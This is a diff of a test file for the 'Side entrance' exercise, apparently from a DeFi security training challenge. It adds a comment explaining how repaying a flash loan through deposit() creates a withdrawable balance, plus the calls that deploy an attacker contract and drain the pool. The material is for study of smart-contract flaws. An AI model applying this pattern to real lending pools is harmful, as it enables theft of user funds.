@@ -25,11 +25,23 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /**
+        * Exploit Overview
+        * 
+        * @dev
+        * 
+        * The vulnerability is that the function deposit allows us to repay the flash loan but 
+        * creating us a legitimate balance in the pool that we can later withdraw.
+        *
+        * You can find the contracts i wrote on /contracts/attacker-contracts
+     */
+
         const AttackSideEntranceLenderPoolFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
         this.attackerContract = await AttackSideEntranceLenderPoolFactory.deploy()
 
         await this.attackerContract.startAttack(ethers.utils.parseEther('1000'),this.pool.address)
-        await this.attackerContract.retirar()
+        await this.attackerContract._withdraw()
     });
 
     after(async function () {
